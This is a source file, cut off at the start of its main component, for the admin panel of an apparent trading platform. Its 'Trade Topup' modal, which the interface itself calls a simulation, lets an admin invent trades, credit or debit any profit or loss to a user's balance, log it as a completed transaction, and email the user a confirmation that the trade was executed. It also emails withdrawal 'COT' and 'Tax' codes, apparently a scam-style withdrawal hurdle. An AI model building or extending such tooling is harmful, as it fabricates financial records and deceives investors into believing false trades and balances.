import { useEffect, useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { supabase as supabaseTyped } from "@/lib/supabaseClient";
const supabase: any = supabaseTyped;
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { StatusBadge } from "../components/StatusBadge";
import { BalanceModal } from "../components/BalanceModal";
import { toast } from "sonner";
import {
  Trash2, Ban, CheckCircle2, AlertTriangle, ArrowLeft, KeyRound, ShieldAlert,
  Sparkles, Briefcase, TrendingUp, TrendingDown, Clock, ChevronDown,
  DollarSign, BarChart2, X, Mail,
} from "lucide-react";
import { currencySymbol, formatMoney } from "@/lib/currency";
import { notifyEmail } from "../lib/notifyEmail";

const ACCOUNT_LEVELS = ["Basic", "Veteran Account", "Master", "Ultimate Account", "Diamond Account"];
const genCode = () => Math.random().toString(36).slice(2, 10).toUpperCase();
type CodeType = "auth" | "cot" | "tax";

// Generate a random Trade ID
const genTradeId = () => Math.floor(10000000 + Math.random() * 90000000).toString();

// Collapses newlines/whitespace between HTML tags so emails don't render
// with large blank gaps (newlines in the template get turned into <br/>
// by the send-email function otherwise).
const minifyHtml = (html: string) => html.replace(/\n\s*/g, "").replace(/>\s+</g, "><");

const codeLabel = (k: CodeType) => (k === "auth" ? "Auth Code" : k === "cot" ? "COT Code" : "Tax Code");

// Default subject/body for the "send code by email" modal
const codeEmailDefaults = (type: CodeType, code: string) => {
  const nameLower = type === "auth" ? "authentication" : type === "cot" ? "COT" : "tax";
  const nameTitle = type === "auth" ? "Authentication" : type === "cot" ? "COT" : "Tax";
  return {
    subject: `Your Withdrawal ${nameTitle} Code`,
    body: `<p style="margin:0 0 16px 0;">Enter ${nameLower} code to complete your withdrawal.</p>
<div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:18px;text-align:center;margin:0 0 16px 0;">
  <p style="margin:0;font-size:26px;font-weight:700;letter-spacing:6px;color:#0f172a;font-family:monospace;">${code || "••••••"}</p>
</div>
<p style="margin:0;font-size:13px;color:#64748b;line-height:1.6;">If you did not request this withdrawal, please contact our support team immediately.</p>`,
  };
};

// Trade pair groups
const TRADE_PAIRS: Record<string, string[]> = {
  "Major Forex Pairs": [
    "EUR/USD", "GBP/USD", "USD/JPY", "USD/CHF",
    "USD/CAD", "AUD/USD", "NZD/USD",
  ],
  "Minor Forex Pairs": [
    "EUR/GBP", "EUR/JPY", "EUR/CHF", "EUR/AUD", "EUR/CAD",
    "GBP/JPY", "GBP/CHF", "GBP/AUD", "GBP/CAD",
    "AUD/JPY", "AUD/CHF", "AUD/CAD", "NZD/JPY", "CAD/JPY",
  ],
  "Exotic Forex Pairs": [
    "USD/MXN", "USD/BRL", "USD/ZAR", "USD/TRY", "USD/SGD",
    "USD/HKD", "USD/NOK", "USD/SEK", "USD/DKK", "USD/PLN",
    "USD/HUF", "USD/CZK", "USD/THB", "USD/INR", "USD/CNY",
    "USD/AED", "USD/SAR", "USD/EGP", "USD/NGN", "USD/KES",
    "EUR/TRY", "EUR/NOK", "EUR/SEK", "EUR/PLN", "EUR/HUF",
    "GBP/NOK", "GBP/SEK", "GBP/TRY",
  ],
  "Crypto Pairs": [
    "BTC/USD", "ETH/USD", "BTC/EUR", "ETH/EUR",
    "BNB/USD", "XRP/USD", "SOL/USD", "ADA/USD",
    "DOGE/USD", "AVAX/USD", "DOT/USD", "MATIC/USD",
    "LTC/USD", "LINK/USD", "UNI/USD", "ATOM/USD",
    "BTC/USDT", "ETH/USDT", "BNB/USDT",
  ],
  "Stock Indices": [
    "S&P 500", "NASDAQ 100", "DOW JONES", "FTSE 100",
    "DAX 40", "CAC 40", "NIKKEI 225", "ASX 200",
    "HANG SENG", "EURO STOXX 50", "RUSSELL 2000",
  ],
  "Commodities": [
    "XAU/USD (Gold)", "XAG/USD (Silver)", "WTI Crude Oil",
    "Brent Crude Oil", "Natural Gas", "Copper", "Platinum", "Palladium",
  ],
};

const TIME_DURATIONS = [
  "30 seconds", "1 minute", "2 minutes", "5 minutes", "10 minutes",
  "15 minutes", "30 minutes", "1 hour", "2 hours", "4 hours",
  "8 hours", "12 hours", "1 day", "3 days", "1 week",
];

// Full ISO 4217 currency list
const ALL_CURRENCIES = [
  { code: "AED", name: "UAE Dirham" },
  { code: "AFN", name: "Afghan Afghani" },
  { code: "ALL", name: "Albanian Lek" },
  { code: "AMD", name: "Armenian Dram" },
  { code: "ANG", name: "Netherlands Antillean Guilder" },
  { code: "AOA", name: "Angolan Kwanza" },
  { code: "ARS", name: "Argentine Peso" },
  { code: "AUD", name: "Australian Dollar" },
  { code: "AWG", name: "Aruban Florin" },
  { code: "AZN", name: "Azerbaijani Manat" },
  { code: "BAM", name: "Bosnia-Herzegovina Convertible Mark" },
  { code: "BBD", name: "Barbadian Dollar" },
  { code: "BDT", name: "Bangladeshi Taka" },
  { code: "BGN", name: "Bulgarian Lev" },
  { code: "BHD", name: "Bahraini Dinar" },
  { code: "BIF", name: "Burundian Franc" },
  { code: "BMD", name: "Bermudan Dollar" },
  { code: "BND", name: "Brunei Dollar" },
  { code: "BOB", name: "Bolivian Boliviano" },
  { code: "BRL", name: "Brazilian Real" },
  { code: "BSD", name: "Bahamian Dollar" },
  { code: "BTN", name: "Bhutanese Ngultrum" },
  { code: "BWP", name: "Botswanan Pula" },
  { code: "BYN", name: "Belarusian Ruble" },
  { code: "BZD", name: "Belize Dollar" },
  { code: "CAD", name: "Canadian Dollar" },
  { code: "CDF", name: "Congolese Franc" },
  { code: "CHF", name: "Swiss Franc" },
  { code: "CLP", name: "Chilean Peso" },
  { code: "CNY", name: "Chinese Yuan" },
  { code: "COP", name: "Colombian Peso" },
  { code: "CRC", name: "Costa Rican Colón" },
  { code: "CUP", name: "Cuban Peso" },
  { code: "CVE", name: "Cape Verdean Escudo" },
  { code: "CZK", name: "Czech Koruna" },
  { code: "DJF", name: "Djiboutian Franc" },
  { code: "DKK", name: "Danish Krone" },
  { code: "DOP", name: "Dominican Peso" },
  { code: "DZD", name: "Algerian Dinar" },
  { code: "EGP", name: "Egyptian Pound" },
  { code: "ERN", name: "Eritrean Nakfa" },
  { code: "ETB", name: "Ethiopian Birr" },
  { code: "EUR", name: "Euro" },
  { code: "FJD", name: "Fijian Dollar" },
  { code: "FKP", name: "Falkland Islands Pound" },
  { code: "GBP", name: "British Pound" },
  { code: "GEL", name: "Georgian Lari" },
  { code: "GHS", name: "Ghanaian Cedi" },
  { code: "GIP", name: "Gibraltar Pound" },
  { code: "GMD", name: "Gambian Dalasi" },
  { code: "GNF", name: "Guinean Franc" },
  { code: "GTQ", name: "Guatemalan Quetzal" },
  { code: "GYD", name: "Guyanaese Dollar" },
  { code: "HKD", name: "Hong Kong Dollar" },
  { code: "HNL", name: "Honduran Lempira" },
  { code: "HRK", name: "Croatian Kuna" },
  { code: "HTG", name: "Haitian Gourde" },
  { code: "HUF", name: "Hungarian Forint" },
  { code: "IDR", name: "Indonesian Rupiah" },
  { code: "ILS", name: "Israeli New Shekel" },
  { code: "INR", name: "Indian Rupee" },
  { code: "IQD", name: "Iraqi Dinar" },
  { code: "IRR", name: "Iranian Rial" },
  { code: "ISK", name: "Icelandic Króna" },
  { code: "JMD", name: "Jamaican Dollar" },
  { code: "JOD", name: "Jordanian Dinar" },
  { code: "JPY", name: "Japanese Yen" },
  { code: "KES", name: "Kenyan Shilling" },
  { code: "KGS", name: "Kyrgystani Som" },
  { code: "KHR", name: "Cambodian Riel" },
  { code: "KMF", name: "Comorian Franc" },
  { code: "KPW", name: "North Korean Won" },
  { code: "KRW", name: "South Korean Won" },
  { code: "KWD", name: "Kuwaiti Dinar" },
  { code: "KYD", name: "Cayman Islands Dollar" },
  { code: "KZT", name: "Kazakhstani Tenge" },
  { code: "LAK", name: "Laotian Kip" },
  { code: "LBP", name: "Lebanese Pound" },
  { code: "LKR", name: "Sri Lankan Rupee" },
  { code: "LRD", name: "Liberian Dollar" },
  { code: "LSL", name: "Lesotho Loti" },
  { code: "LYD", name: "Libyan Dinar" },
  { code: "MAD", name: "Moroccan Dirham" },
  { code: "MDL", name: "Moldovan Leu" },
  { code: "MGA", name: "Malagasy Ariary" },
  { code: "MKD", name: "Macedonian Denar" },
  { code: "MMK", name: "Myanmar Kyat" },
  { code: "MNT", name: "Mongolian Tugrik" },
  { code: "MOP", name: "Macanese Pataca" },
  { code: "MRU", name: "Mauritanian Ouguiya" },
  { code: "MUR", name: "Mauritian Rupee" },
  { code: "MVR", name: "Maldivian Rufiyaa" },
  { code: "MWK", name: "Malawian Kwacha" },
  { code: "MXN", name: "Mexican Peso" },
  { code: "MYR", name: "Malaysian Ringgit" },
  { code: "MZN", name: "Mozambican Metical" },
  { code: "NAD", name: "Namibian Dollar" },
  { code: "NGN", name: "Nigerian Naira" },
  { code: "NIO", name: "Nicaraguan Córdoba" },
  { code: "NOK", name: "Norwegian Krone" },
  { code: "NPR", name: "Nepalese Rupee" },
  { code: "NZD", name: "New Zealand Dollar" },
  { code: "OMR", name: "Omani Rial" },
  { code: "PAB", name: "Panamanian Balboa" },
  { code: "PEN", name: "Peruvian Sol" },
  { code: "PGK", name: "Papua New Guinean Kina" },
  { code: "PHP", name: "Philippine Peso" },
  { code: "PKR", name: "Pakistani Rupee" },
  { code: "PLN", name: "Polish Zloty" },
  { code: "PYG", name: "Paraguayan Guarani" },
  { code: "QAR", name: "Qatari Rial" },
  { code: "RON", name: "Romanian Leu" },
  { code: "RSD", name: "Serbian Dinar" },
  { code: "RUB", name: "Russian Ruble" },
  { code: "RWF", name: "Rwandan Franc" },
  { code: "SAR", name: "Saudi Riyal" },
  { code: "SBD", name: "Solomon Islands Dollar" },
  { code: "SCR", name: "Seychellois Rupee" },
  { code: "SDG", name: "Sudanese Pound" },
  { code: "SEK", name: "Swedish Krona" },
  { code: "SGD", name: "Singapore Dollar" },
  { code: "SHP", name: "Saint Helena Pound" },
  { code: "SLL", name: "Sierra Leonean Leone" },
  { code: "SOS", name: "Somali Shilling" },
  { code: "SRD", name: "Surinamese Dollar" },
  { code: "STN", name: "São Tomé & Príncipe Dobra" },
  { code: "SVC", name: "Salvadoran Colón" },
  { code: "SYP", name: "Syrian Pound" },
  { code: "SZL", name: "Swazi Lilangeni" },
  { code: "THB", name: "Thai Baht" },
  { code: "TJS", name: "Tajikistani Somoni" },
  { code: "TMT", name: "Turkmenistani Manat" },
  { code: "TND", name: "Tunisian Dinar" },
  { code: "TOP", name: "Tongan Paʻanga" },
  { code: "TRY", name: "Turkish Lira" },
  { code: "TTD", name: "Trinidad & Tobago Dollar" },
  { code: "TWD", name: "New Taiwan Dollar" },
  { code: "TZS", name: "Tanzanian Shilling" },
  { code: "UAH", name: "Ukrainian Hryvnia" },
  { code: "UGX", name: "Ugandan Shilling" },
  { code: "USD", name: "US Dollar" },
  { code: "UYU", name: "Uruguayan Peso" },
  { code: "UZS", name: "Uzbekistani Som" },
  { code: "VES", name: "Venezuelan Bolívar" },
  { code: "VND", name: "Vietnamese Dong" },
  { code: "VUV", name: "Vanuatu Vatu" },
  { code: "WST", name: "Samoan Tala" },
  { code: "XAF", name: "Central African CFA Franc" },
  { code: "XCD", name: "East Caribbean Dollar" },
  { code: "XOF", name: "West African CFA Franc" },
  { code: "XPF", name: "CFP Franc" },
  { code: "YER", name: "Yemeni Rial" },
  { code: "ZAR", name: "South African Rand" },
  { code: "ZMW", name: "Zambian Kwacha" },
  { code: "ZWL", name: "Zimbabwean Dollar" },
];

// ─── Trade Topup Modal ────────────────────────────────────────────────────────
interface TradeTopupModalProps {
  open: boolean;
  onOpenChange: (v: boolean) => void;
  user: any;
  onSaved: () => void;
}

function TradeTopupModal({ open, onOpenChange, user, onSaved }: TradeTopupModalProps) {
  const now = new Date();

  const [pairGroup, setPairGroup] = useState("Major Forex Pairs");
  const [pair, setPair] = useState("EUR/USD");
  const [method, setMethod] = useState<"profit" | "loss">("profit");
  const [earnings, setEarnings] = useState("");
  const [amount, setAmount] = useState("");
  const [duration, setDuration] = useState("30 seconds");
  const [sendMail, setSendMail] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  // Auto-generate times
  const execTime = now.toLocaleString("en-US", {
    month: "short", day: "2-digit", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false,
  }).replace(",", "");

  // Parse duration to seconds for closing time calc
  const durationToSeconds = (d: string): number => {
    const map: Record<string, number> = {
      "30 seconds": 30, "1 minute": 60, "2 minutes": 120, "5 minutes": 300,
      "10 minutes": 600, "15 minutes": 900, "30 minutes": 1800,
      "1 hour": 3600, "2 hours": 7200, "4 hours": 14400,
      "8 hours": 28800, "12 hours": 43200, "1 day": 86400,
      "3 days": 259200, "1 week": 604800,
    };
    return map[d] ?? 30;
  };

  const closeTime = new Date(now.getTime() + durationToSeconds(duration) * 1000)
    .toLocaleString("en-US", {
      month: "short", day: "2-digit", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false,
    }).replace(",", "");

  const tradeId = genTradeId();
  const currentBalance = Number(user?.total_balance ?? 0);
  const currentProfit = Number(user?.profit ?? 0);
  const earningsNum = parseFloat(earnings) || 0;
  const amountNum = parseFloat(amount) || 0;

  const handleSubmit = async () => {
    if (!earningsNum) return toast.error("Enter earnings/loss amount");
    if (!amountNum) return toast.error("Enter trade amount");
    if (method === "loss" && earningsNum > currentBalance) {
      return toast.error(`Loss cannot exceed current balance (${formatMoney(currentBalance, user?.currency)})`);
    }
    if (amountNum > currentBalance) {
      return toast.error(`Trade amount cannot exceed current balance (${formatMoney(currentBalance, user?.currency)})`);
    }

    setSubmitting(true);

    // Calculate new balance + profit
    const profitDelta = method === "profit" ? earningsNum : -earningsNum;
    const newProfit = currentProfit + profitDelta;
    const newBalance = currentBalance + profitDelta;

    // Update profiles
    const { error: profileErr } = await (supabase as any)
      .from("profiles")
      .update({
        total_balance: newBalance,
        profit: newProfit,
      })
      .eq("user_id", user.user_id);

    if (profileErr) {
      setSubmitting(false);
      return toast.error(profileErr.message);
    }

    // Insert transaction row so it shows in history
    await (supabase as any).from("transactions").insert({
      user_id: user.user_id,
      type: "profit",
      method: `Trade · ${pair}`,
      amount: profitDelta,
      amount_usd: profitDelta,
      status: "completed",
      description: `Trade ID ${tradeId} · ${pair} · ${duration}`,
    });

    // Send email via notifyEmail (same pattern as DepositsPage)
    const isProfit = method === "profit";
    await notifyEmail({
      send: sendMail,
      userId: user.user_id,
      email: user.email,
      intent: "profit_added",
      subject: `Trade Execution Confirmation — ${pair}`,
      body: minifyHtml(`
<p style="margin:0 0 20px 0;">Your trade has been executed successfully on your account. Please review the details below.</p>

<table style="width:100%; border-collapse:collapse; margin-bottom:24px;">
  <tr style="background:#f8fafc;">
    <td style="padding:10px 14px; font-size:13px; color:#64748b; border-bottom:1px solid #e2e8f0; width:45%;">Trade ID</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:600; color:#0f172a; border-bottom:1px solid #e2e8f0;">#${tradeId}</td>
  </tr>
  <tr>
    <td style="padding:10px 14px; font-size:13px; color:#64748b; border-bottom:1px solid #e2e8f0;">Trade Pair</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:600; color:#0f172a; border-bottom:1px solid #e2e8f0;">${pair}</td>
  </tr>
  <tr style="background:#f8fafc;">
    <td style="padding:10px 14px; font-size:13px; color:#64748b; border-bottom:1px solid #e2e8f0;">Execution Time (UTC)</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:600; color:#0f172a; border-bottom:1px solid #e2e8f0;">${execTime}</td>
  </tr>
  <tr>
    <td style="padding:10px 14px; font-size:13px; color:#64748b; border-bottom:1px solid #e2e8f0;">Closing Time (UTC)</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:600; color:#0f172a; border-bottom:1px solid #e2e8f0;">${closeTime}</td>
  </tr>
  <tr style="background:#f8fafc;">
    <td style="padding:10px 14px; font-size:13px; color:#64748b; border-bottom:1px solid #e2e8f0;">Duration</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:600; color:#0f172a; border-bottom:1px solid #e2e8f0;">${duration}</td>
  </tr>
  <tr>
    <td style="padding:10px 14px; font-size:13px; color:#64748b; border-bottom:1px solid #e2e8f0;">Amount Placed</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:600; color:#0f172a; border-bottom:1px solid #e2e8f0;">${formatMoney(amountNum, user?.currency)}</td>
  </tr>
  <tr style="background:#f8fafc;">
    <td style="padding:10px 14px; font-size:13px; color:#64748b; border-bottom:1px solid #e2e8f0;">Result</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:700; border-bottom:1px solid #e2e8f0; color:${isProfit ? "#16a34a" : "#dc2626"};">
      ${isProfit ? "+" : "-"}${formatMoney(earningsNum, user?.currency)} (${isProfit ? "Profit" : "Loss"})
    </td>
  </tr>
  <tr>
    <td style="padding:10px 14px; font-size:13px; color:#64748b;">Updated Balance</td>
    <td style="padding:10px 14px; font-size:13px; font-weight:700; color:#0f172a;">${formatMoney(newBalance, user?.currency)}</td>
  </tr>
</table>

<p style="margin:0 0 16px 0; font-size:13px; color:#64748b; line-height:1.6;">
  Your account balance has been updated to reflect this trade. Log in to your dashboard to view your full portfolio and transaction history.
</p>

<p style="margin:0; font-size:13px; color:#64748b;">
  If you have any questions or did not authorise this trade, please contact our support team immediately.
</p>`),
    });

    setSubmitting(false);
    toast.success(`Trade ${method === "profit" ? "profit" : "loss"} of ${formatMoney(earningsNum, user?.currency)} applied`);
    onOpenChange(false);
    onSaved();

    // Reset form
    setEarnings("");
    setAmount("");
    setDuration("30 seconds");
    setSendMail(false);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-lg rounded-2xl p-0 overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-5 border-b border-border"
          style={{ background: "linear-gradient(135deg, #1e40af 0%, #3b82f6 100%)" }}>
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
              <BarChart2 className="w-5 h-5 text-white" />
            </div>
            <div>
              <DialogTitle className="text-white font-semibold text-base">Trade Topup</DialogTitle>
              <p className="text-white/70 text-[11px] mt-0.5">Simulate a trade execution for this user</p>
            </div>
          </div>
          <p className="text-white/50 text-[10px] font-mono">ID #{tradeId}</p>
        </div>

        <div className="px-6 py-5 space-y-5">
          {/* Balance context */}
          <div className="grid grid-cols-3 gap-2">
            <div className="rounded-xl bg-muted/40 p-3 text-center">
              <p className="text-[10px] text-muted-foreground uppercase tracking-wider mb-1">Balance</p>
              <p className="font-semibold text-[13px] text-emerald-600">{formatMoney(currentBalance, user?.currency)}</p>
            </div>
            <div className="rounded-xl bg-muted/40 p-3 text-center">
              <p className="text-[10px] text-muted-foreground uppercase tracking-wider mb-1">Profit</p>
              <p className="font-semibold text-[13px] text-sky-600">{formatMoney(currentProfit, user?.currency)}</p>
            </div>
            <div className="rounded-xl bg-muted/40 p-3 text-center">
              <p className="text-[10px] text-muted-foreground uppercase tracking-wider mb-1">After Trade</p>
              <p className={`font-semibold text-[13px] ${
                method === "profit" ? "text-emerald-600" : "text-red-500"
              }`}>
                {earningsNum
                  ? formatMoney(method === "profit" ? currentBalance + earningsNum : currentBalance - earningsNum, user?.currency)
                  : "—"}
              </p>
            </div>
          </div>

          {/* Pair group + pair */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-[12px]">Pair Group</Label>
              <select
                value={pairGroup}
                onChange={(e) => {
                  setPairGroup(e.target.value);
                  setPair(TRADE_PAIRS[e.target.value][0]);
                }}
                className="mt-1 w-full rounded-lg border border-input bg-[#E5E7EB] text-[#111111] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                {Object.keys(TRADE_PAIRS).map((g) => (
                  <option key={g} value={g}>{g}</option>
                ))}
              </select>
            </div>
            <div>
              <Label className="text-[12px]">Trade Pair</Label>
              <select
                value={pair}
                onChange={(e) => setPair(e.target.value)}
                className="mt-1 w-full rounded-lg border border-input bg-[#E5E7EB] text-[#111111] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                {TRADE_PAIRS[pairGroup].map((p) => (
                  <option key={p} value={p}>{p}</option>
                ))}
              </select>
            </div>
          </div>

          {/* Method toggle — Profit / Loss */}
          <div>
            <Label className="text-[12px]">Result</Label>
            <div className="mt-1 grid grid-cols-2 gap-2">
              <button
                type="button"
                onClick={() => setMethod("profit")}
                className={`flex items-center justify-center gap-2 rounded-xl border py-2.5 text-[13px] font-semibold transition-all ${
                  method === "profit"
                    ? "border-emerald-500 bg-emerald-500/10 text-emerald-600"
                    : "border-border text-muted-foreground hover:border-emerald-400"
                }`}
              >
                <TrendingUp className="w-4 h-4" /> Profit
              </button>
              <button
                type="button"
                onClick={() => setMethod("loss")}
                className={`flex items-center justify-center gap-2 rounded-xl border py-2.5 text-[13px] font-semibold transition-all ${
                  method === "loss"
                    ? "border-red-500 bg-red-500/10 text-red-600"
                    : "border-border text-muted-foreground hover:border-red-400"
                }`}
              >
                <TrendingDown className="w-4 h-4" /> Loss
              </button>
            </div>
          </div>

          {/* Earnings + Amount */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-[12px]">
                {method === "profit" ? "Profit Earned" : "Loss Amount"}
              </Label>
              <div className="relative mt-1">
                <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
                <Input
                  type="number"
                  min="0"
                  step="0.01"
                  value={earnings}
                  onChange={(e) => setEarnings(e.target.value)}
                  placeholder="0.00"
                  className="pl-8"
                />
              </div>
              {method === "loss" && earningsNum > currentBalance && (
                <p className="text-[10px] text-red-500 mt-1">Exceeds balance</p>
              )}
            </div>
            <div>
              <Label className="text-[12px]">Amount Placed</Label>
              <div className="relative mt-1">
                <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
                <Input
                  type="number"
                  min="0"
                  step="0.01"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="pl-8"
                />
              </div>
              {amountNum > currentBalance && (
                <p className="text-[10px] text-red-500 mt-1">Exceeds balance</p>
              )}
            </div>
          </div>

          {/* Duration */}
          <div>
            <Label className="text-[12px]">Time Duration</Label>
            <div className="mt-1 grid grid-cols-2 gap-3">
              <select
                value={duration}
                onChange={(e) => setDuration(e.target.value)}
                className="col-span-2 w-full rounded-lg border border-input bg-[#E5E7EB] text-[#111111] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                {TIME_DURATIONS.map((d) => (
                  <option key={d} value={d}>{d}</option>
                ))}
              </select>
            </div>
            {/* Show auto-generated timestamps */}
            <div className="mt-2 grid grid-cols-2 gap-2">
              <div className="rounded-lg bg-muted/30 px-3 py-2">
                <p className="text-[9px] text-muted-foreground uppercase tracking-wider">Execution</p>
                <p className="text-[11px] font-mono text-foreground mt-0.5">{execTime}</p>
              </div>
              <div className="rounded-lg bg-muted/30 px-3 py-2">
                <p className="text-[9px] text-muted-foreground uppercase tracking-wider">Closing</p>
                <p className="text-[11px] font-mono text-foreground mt-0.5">{closeTime}</p>
              </div>
            </div>
          </div>

          {/* Send mail toggle */}
          <div className="flex items-center justify-between rounded-xl border border-border bg-muted/20 px-4 py-3">
            <div className="flex items-center gap-2.5">
              <Mail className="w-4 h-4 text-muted-foreground" />
              <div>
                <p className="text-[13px] font-medium">Send trade confirmation email</p>
                <p className="text-[11px] text-muted-foreground">Notifies user with full trade details</p>
              </div>
            </div>
            <Switch checked={sendMail} onCheckedChange={setSendMail} />
          </div>

          {/* Actions */}
          <div className="flex gap-3 pt-1">
            <Button
              variant="outline"
              className="flex-1 rounded-xl"
              onClick={() => onOpenChange(false)}
              disabled={submitting}
            >
              Cancel
            </Button>
            <Button
              className="flex-1 rounded-xl"
              onClick={handleSubmit}
              disabled={submitting}
              style={{ background: "linear-gradient(135deg, #1e40af 0%, #3b82f6 100%)" }}
            >
              {submitting ? (
                <span className="flex items-center gap-2">
                  <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
                  Applying…
                </span>
              ) : (
                `Apply ${method === "profit" ? "Profit" : "Loss"}`
              )}
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}

// ─── Code Email Modal (per-code save + optional email) ───────────────────────
interface CodeEmailModalProps {
  open: boolean;
  onOpenChange: (v: boolean) => void;
  type: CodeType | null;
  code: string;
  userEmail?: string;
  onConfirm: (subject: string, body: string, sendEmail: boolean) => Promise<void>;
}

function CodeEmailModal({ open, onOpenChange, type, code, userEmail, onConfirm }: CodeEmailModalProps) {
  const [subject, setSubject] = useState("");
  const [body, setBody] = useState("");
  const [sendEmail, setSendEmail] = useState(true);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (open && type) {
      const defaults = codeEmailDefaults(type, code);
      setSubject(defaults.subject);
      setBody(defaults.body);
      setSendEmail(true);
    }
  }, [open, type, code]);

  if (!type) return null;
  const label = codeLabel(type);

  const handleConfirm = async () => {
    setSubmitting(true);
    await onConfirm(subject, body, sendEmail);
    setSubmitting(false);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-lg rounded-2xl p-0 overflow-hidden">
        <div className="flex items-center justify-between px-6 py-5 border-b border-border"
          style={{ background: "linear-gradient(135deg, #b45309 0%, #f59e0b 100%)" }}>
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
              <ShieldAlert className="w-5 h-5 text-white" />
            </div>
            <div>
              <DialogTitle className="text-white font-semibold text-base">Save {label}</DialogTitle>
              <p className="text-white/70 text-[11px] mt-0.5">Confirm and optionally email the code to the user</p>
            </div>
          </div>
        </div>

        <div className="px-6 py-5 space-y-4">
          <div className="rounded-xl bg-muted/40 p-3 text-center">
            <p className="text-[10px] text-muted-foreground uppercase tracking-wider mb-1">Code</p>
            <p className="font-mono font-bold text-lg tracking-widest">{code || "—"}</p>
          </div>

          <div className="flex items-center justify-between rounded-xl border border-border bg-muted/20 px-4 py-3">
            <div className="flex items-center gap-2.5">
              <Mail className="w-4 h-4 text-muted-foreground" />
              <div>
                <p className="text-[13px] font-medium">Send code to email</p>
                <p className="text-[11px] text-muted-foreground">{userEmail || "No email on file"}</p>
              </div>
            </div>
            <Switch checked={sendEmail} onCheckedChange={setSendEmail} />
          </div>

          {sendEmail && (
            <>
              <div>
                <Label className="text-[12px]">Subject</Label>
                <Input value={subject} onChange={(e) => setSubject(e.target.value)} className="mt-1" />
              </div>
              <div>
                <Label className="text-[12px]">Body (HTML)</Label>
                <textarea
                  value={body}
                  onChange={(e) => setBody(e.target.value)}
                  rows={8}
                  className="mt-1 w-full rounded-lg border border-input bg-background px-3 py-2 text-xs font-mono focus:outline-none focus:ring-2 focus:ring-ring"
                />
              </div>
            </>
          )}

          <div className="flex gap-3 pt-1">
            <Button variant="outline" className="flex-1 rounded-xl" onClick={() => onOpenChange(false)} disabled={submitting}>
              Cancel
            </Button>
            <Button
              className="flex-1 rounded-xl"
              onClick={handleConfirm}
              disabled={submitting}
              style={{ background: "linear-gradient(135deg, #b45309 0%, #f59e0b 100%)" }}
            >
              {submitting ? (
                <span className="flex items-center gap-2">
                  <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
                  Saving…
                </span>
              ) : sendEmail ? "Save & Send" : "Save Code"}
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}

// ─── Custom Email Card ─────────────────────────────────────────────────────
function CustomEmailCard({ userId, userEmail }: { userId: string; userEmail?: string }) {
  const [subject, setSubject] = useState("");
  const [body, setBody] = useState("");
  const [sending, setSending] = useState(false);

  const send = async () => {
    if (!subject.trim()) return toast.error("Enter a subject");
    if (!body.trim()) return toast.error("Enter a message");
    setSending(true);

    const bodyHtml = body
      .trim()
      .split("\n")
      .filter((line) => line.length > 0)
      .map((line) => `<p style="margin:0 0 12px 0;">${line}</p>`)
      .join("");

    await notifyEmail({
      send: true,
      userId,
      email: userEmail,
      intent: "custom_email",
      subject: subject.trim(),
      body: minifyHtml(bodyHtml),
    });

    setSending(false);
    toast.success("Email sent");
    setSubject("");
    setBody("");
  };

  return (
    <Card>
      <CardHeader className="pb-2">
        <CardTitle className="flex items-center gap-2 text-base">
          <Mail className="h-4 w-4 text-blue-500" /> Custom Email
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-3">
        <p className="text-xs text-muted-foreground">
          Send a one-off email to {userEmail || "this user"}.
        </p>
        <div>
          <Label className="text-[12px]">Subject</Label>
          <Input value={subject} onChange={(e) => setSubject(e.target.value)} placeholder="Enter subject" className="mt-1" />
        </div>
        <div>
          <Label className="text-[12px]">Message</Label>
          <textarea
            value={body}
            onChange={(e) => setBody(e.target.value)}
            rows={6}
            placeholder="Enter your message"
            className="mt-1 w-full rounded-lg border border-input bg-background px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-ring"
          />
        </div>
        <Button onClick={send} disabled={sending}>
          {sending ? (
            <span className="flex items-center gap-2">
              <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
              Sending…
            </span>
          ) : (
            "Send Email"
          )}
        </Button>
      </CardContent>
    </Card>
  );
}

// ─── Main UserDetail ──────────────────────────────────────────────────────────
export default function UserDetail() {
